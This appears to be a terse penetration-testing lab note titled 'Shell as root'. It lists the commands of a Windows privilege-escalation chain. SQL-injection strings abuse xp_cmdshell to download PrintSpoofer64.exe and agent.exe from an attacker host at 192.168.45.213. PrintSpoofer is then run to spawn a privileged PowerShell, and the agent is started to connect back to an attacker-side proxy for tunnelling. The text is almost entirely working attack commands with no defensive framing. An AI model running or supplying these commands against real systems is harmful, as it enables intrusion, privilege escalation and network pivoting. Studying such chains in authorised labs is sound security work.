# Shell as root

```
cd c:/users/public
```

```
'EXEC xp_cmdshell "powershell.exe wget http://192.168.45.213:8000/PrintSpoofer64.exe -OutFile c:\Users\Public\PrintSpoofer64.exe"--
```

```
.\PrintSpoofer64.exe -i -c powershell.exe
```

##### Upload agent.exe

```
'EXEC xp_cmdshell "powershell.exe wget http://192.168.45.213:8000/agent.exe -OutFile c:\Users\Public\agent.exe"--
```

#### Start Agent & Proxy
```
.\agent.exe -ignore-cert -connect 192.168.45.213:11601
```

Kali:
```
.\proxy -self-cert
```